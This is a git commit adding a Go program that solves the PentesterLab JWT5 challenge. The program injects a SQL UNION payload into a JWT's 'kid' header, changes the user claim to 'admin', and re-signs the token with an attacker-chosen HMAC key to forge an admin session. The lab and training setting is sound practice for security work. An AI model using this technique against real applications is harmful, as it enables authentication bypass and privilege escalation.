993d2bc6826802f870c41b2a0ff76acaf301124f
Daehee Park <hello@daehee.com>
2019-10-25 23:38:58 -0700

    PentesterLab JWT5 Challenge

---
+++ ptl_jwt5/main.go
@@ -0,0 +1,65 @@
+package main
+
+import (
+	"crypto/hmac"
+	"crypto/sha256"
+	"encoding/base64"
+	"fmt"
+	"strings"
+)
+
+func computeHS256(message, secret string) string {
+	key := []byte(secret)
+	h := hmac.New(sha256.New, key)
+	h.Write([]byte(message))
+	encoded := base64.URLEncoding.EncodeToString(h.Sum(nil))
+	sig := strings.ReplaceAll(string(encoded), "=", "")
+	fmt.Println("[*] New HMAC Signature:")
+	fmt.Println(sig)
+	return sig
+}
+
+// split token into header and payload
+func parseToken(token string) ([]byte, []byte) {
+	tmp := strings.Split(token, ".")
+	header, _ := base64.RawStdEncoding.DecodeString(tmp[0])
+	payload, _ := base64.RawStdEncoding.DecodeString(tmp[1])
+	fmt.Println("[*] Original:")
+	fmt.Println(string(header))
+	fmt.Println(string(payload))
+	return header, payload
+}
+
+// insert malicious values into token and return data for signing
+func attackToken(header, payload []byte) string {
+	mh := []byte(strings.ReplaceAll(string(header), "key1", "blah' UNION SELECT 'aaa"))
+	mp := []byte(strings.ReplaceAll(string(payload), "null", "\"admin\""))
+	fmt.Println("[*] Malicious Replacement:")
+	fmt.Println(string(mh))
+	fmt.Println(string(mp))
+	eh := strings.ReplaceAll(base64.URLEncoding.EncodeToString(mh), "=", "")
+	ep := strings.ReplaceAll(base64.URLEncoding.EncodeToString(mp), "=", "")
+	data := strings.Join([]string{eh, ep}, ".")
+	return data
+}
+
+func bakeNewToken(data string, sig string) string {
+	combined := strings.Join([]string{data, sig}, ".")
+	return combined
+}
+
+func main() {
+	// known public key
+	pub := []byte("aaa")
+	// auth cookie when logged in as "test"
+	token := "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
+
+	h, p := parseToken(token)
+	data := attackToken(h, p)
+	sig := computeHS256(data, string(pub))
+	res := bakeNewToken(data, sig)
+
+	fmt.Println("[*] Final payload:")
+	fmt.Println(res)
+
+}
